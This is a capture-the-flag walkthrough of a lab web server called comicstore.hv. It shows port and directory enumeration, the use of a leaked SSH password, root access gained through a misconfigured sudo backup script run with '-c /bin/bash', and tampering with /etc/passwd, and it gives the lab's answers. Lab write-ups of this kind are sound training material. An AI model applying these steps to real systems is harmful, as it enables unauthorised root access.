# 🚩 HackViser: Write-up--Library — WEB Walkthrough By Mohammed-Ali
<img width="1016" height="482" alt="Screenshot 2026-07-16 213949" src="https://github.com/user-attachments/assets/f15d39fa-79da-4696-8f64-433b95bb1bff" />

##  Phase 1: Reconnaissance & Enumeration
<img width="1387" height="582" alt="Screenshot 2026-07-16 214530" src="https://github.com/user-attachments/assets/389c8ecc-cfc1-46ba-b2ad-6d38b1e7a95a" />

An aggressive Nmap scan was conducted to enumerate ports and service versions:
```python
nmap comicstore.hv -sC -sV --open -T4
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-16 21:44 +0300
Nmap scan report for comicstore.hv (172.20.12.136)
Host is up (0.093s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 f1:d3:3d:0e:44:58:c2:6e:7c:32:e2:9f:aa:d4:32:40 (ECDSA)
|_  256 10:6f:37:a1:79:c5:15:08:9c:23:44:ea:24:10:84:27 (ED25519)
80/tcp   open  http    Apache httpd 2.4.57 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
|_http-title: Comic Store
|_http-server-header: Apache/2.4.57 (Debian)
|_http-generator: WordPress 6.5.2
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.24 seconds
```
## Findings: Port 22 (SSH) and Port 80 (HTTP) were identified as open and mysql 3306

## the Questions your Lab 

<img width="542" height="125" alt="Screenshot 2026-07-16 214810" src="https://github.com/user-attachments/assets/530f8c38-683c-4e76-82f4-b4013892c984" />
### if you look on website the only user is :  Johnny 

<img width="1550" height="925" alt="Screenshot 2026-07-16 214947" src="https://github.com/user-attachments/assets/bea80312-27e2-4c73-92df-b0745748e9ed" />

# Q2:
<img width="786" height="131" alt="image" src="https://github.com/user-attachments/assets/835e2368-f048-4b6f-97d0-13f0608d0a8f" />
### lets use Fuzzing on directory maybe got some things important you can any tool im use the Gobuster 

<img width="1726" height="897" alt="Screenshot 2026-07-16 215612" src="https://github.com/user-attachments/assets/4df1e5e2-ed2c-426d-b11b-dd30303cd4db" />

```python
 gobuster dir -u http://comicstore.hv/ -w /mnt/c/Users/mohammed/Desktop/cyber_security/cyber_security/SecLists-master/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://comicstore.hv/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /mnt/c/Users/mohammed/Desktop/cyber_security/cyber_security/SecLists-master/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 278]
.htaccess            (Status: 403) [Size: 278]
.htpasswd            (Status: 403) [Size: 278]
0                    (Status: 200) [Size: 28710]
_notes               (Status: 301) [Size: 315] [--> http://comicstore.hv/_notes/]
admin                (Status: 302) [Size: 0] [--> http://comicstore.hv/wp-admin/]
atom                 (Status: 200) [Size: 23215]
dashboard            (Status: 302) [Size: 0] [--> http://comicstore.hv/wp-admin/]
embed                (Status: 200) [Size: 28710]
favicon.ico          (Status: 302) [Size: 0] [--> http://comicstore.hv/wp-includes/images/w-logo-blue-white-bg.png]
feed                 (Status: 200) [Size: 21857]
index.php            (Status: 200) [Size: 28710]
javascript           (Status: 301) [Size: 319] [--> http://comicstore.hv/javascript/]
login                (Status: 302) [Size: 0] [--> http://comicstore.hv/wp-login.php]
page1                (Status: 200) [Size: 28710]
rdf                  (Status: 200) [Size: 20776]
robots.txt           (Status: 200) [Size: 67]
rss                  (Status: 200) [Size: 4103]
rss2                 (Status: 200) [Size: 21857]
server-status        (Status: 403) [Size: 278]
wp-admin             (Status: 301) [Size: 317] [--> http://comicstore.hv/wp-admin/]
wp-content           (Status: 301) [Size: 319] [--> http://comicstore.hv/wp-content/]
wp-includes          (Status: 301) [Size: 320] [--> http://comicstore.hv/wp-includes/]
xmlrpc.php           (Status: 405) [Size: 42]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```

### after search i find the password for ssh and more important 
<img width="917" height="522" alt="Screenshot 2026-07-16 215756" src="https://github.com/user-attachments/assets/71468c8a-d2fd-436c-80f0-a55aadc01d1a" />


```python
warthunder forum: 920312036099
my dota account: KR9ZT@Z
my ssh account: bl4z3
reddit alt-account: 2367ruest-emile
steam community: trustno11still07
```
### So i have the username Johnny lets try with this password 

### Yea its work 
<img width="962" height="348" alt="Screenshot 2026-07-16 220118" src="https://github.com/user-attachments/assets/870bfe7d-94e7-4a02-9ab6-7be39216ca7a" />

## Q3:
<img width="647" height="120" alt="image" src="https://github.com/user-attachments/assets/6efb6b65-1a18-4ea6-852c-0f757e7fffc3" />

<img width="822" height="216" alt="image" src="https://github.com/user-attachments/assets/542547d1-a39e-4aab-be56-bd32f04feefb" />

```python
 cd Documents/
johnny@comicstore:~/Documents$ ls
myc0ll3ct1on
johnny@comicstore:~/Documents$
```
## Q4:
<img width="700" height="122" alt="image" src="https://github.com/user-attachments/assets/19ff453c-4b3f-40af-a82f-d493214c8419" />

<img width="1611" height="190" alt="image" src="https://github.com/user-attachments/assets/08249481-d6cb-43db-95e6-d8673fb802a5" />

```python
 sudo -l
Matching Defaults entries for johnny on comicstore:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User johnny may run the following commands on comicstore:
    (root) NOPASSWD: /opt/.securebak/backup_mp3.sh
johnny@comicstore:~/Documents$
```
## Q5:
<img width="660" height="128" alt="image" src="https://github.com/user-attachments/assets/84e0c87b-a6f8-43bf-a10d-82fb0bc183e6" />
### To get this use find >>
<img width="1042" height="53" alt="image" src="https://github.com/user-attachments/assets/1ca01b8e-609e-4c0c-9986-8b5da30dfc62" />

```python
 find / -name "*scamlist*.csv" 2>/dev/null
/home/johnny/Documents/myc0ll3ct1on/scamlist.csv
johnny@comicstore:~/Documents$
```

```
cat: /home/johnny/Documents/myc0ll3ct1on/scamlist.csv: Permission denied
```
## so you should to make root to read this file
lets check SUDO -l 

```
 sudo -l
Matching Defaults entries for johnny on comicstore:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User johnny may run the following commands on comicstore:
    (root) NOPASSWD: /opt/.securebak/backup_mp3.sh
```
## The vulnerability On code 
<img width="1177" height="764" alt="Screenshot 2026-07-16 221113" src="https://github.com/user-attachments/assets/06435895-6b47-4efa-aa49-f1cd21544a55" />

## lets exploit it 

<img width="1310" height="321" alt="image" src="https://github.com/user-attachments/assets/3ac3678a-a8e7-461e-9a62-f089fa4138f0" />

```
 sudo /opt/.securebak/backup_mp3.sh -c "/bin/bash"
tee: /run/media/johnny/BACKUP/backedup.txt: No such file or directory
Backing up /home/johnny/Music/song*.mp3 to /run/media/johnny/BACKUP/comicstore-bak.tar.gz

tar: Removing leading `/' from member names
tar: /home/johnny/Music/song*.mp3: Cannot stat: No such file or directory
tar (child): /run/media/johnny/BACKUP/comicstore-bak.tar.gz: Cannot open: No such file or directory
tar (child): Error is not recoverable: exiting now
tar: Child returned status 2
tar: Error is not recoverable: exiting now

Backup finished
root@comicstore:/home/johnny/Documents# whoami
```
## im root but icant read any thing so lets to change the perrmissions for etc/passwd and insert password from me and get root 

<img width="812" height="192" alt="image" src="https://github.com/user-attachments/assets/41ca4dd7-3172-4d9d-bd35-13e7c007a6b0" />

<img width="527" height="152" alt="image" src="https://github.com/user-attachments/assets/dc853b70-8df9-4002-82fe-049de3e48cff" />

<img width="1072" height="592" alt="image" src="https://github.com/user-attachments/assets/23cb07ba-af14-47fd-b426-9f6d9f48c4f6" />

<img width="783" height="23" alt="image" src="https://github.com/user-attachments/assets/1ed20625-09af-4888-abd8-18aca0f181b1" />

## Now i use the password create it  
<img width="615" height="128" alt="image" src="https://github.com/user-attachments/assets/faaa502f-7b18-4b52-8f2e-e5e66a5cb18e" />

```python
root@comicstore:/home/johnny/Documents# cat /home/johnny/Documents/myc0ll3ct1on/scamlist.csv
Name,ComicIssue,Price,Notes
Garey Elwyn,#144,500,A poor student that is hardly worth it.
Rudy Darryl,#64,350,A total comic book nerd.
Emily Randolf,#98,300,This woman is rolling in money
Jones Nick,#32,500,Idk might get more.
Charleen Kayla,#11,300,Buying for her bf. Raise
root@comicstore:/home/johnny/Documents#
```
<img width="1152" height="187" alt="Screenshot 2026-07-16 222018" src="https://github.com/user-attachments/assets/116ecb0f-40d6-40a6-be22-61a7a1d941fb" />
the answer is Emily Randolf


### About the Author

Mohammed Ali Cybersecurity student focused on penetration testing and Digital Forensics.
accounts on insta

Instagram : https://www.instagram.com/e6ecx/
THM : https://tryhackme.com/p/eng.mohammed.ali.abd

Follow My Journey
I regularly share write-ups and my cybersecurity journey. More content coming soon


### 🛡️ Disclaimer

This writeup is strictly created for educational, ethical hacking research, and professional training purposes within legally authorized lab environments hosted by TryHackMe. All steps were performed against an isolated simulation target.

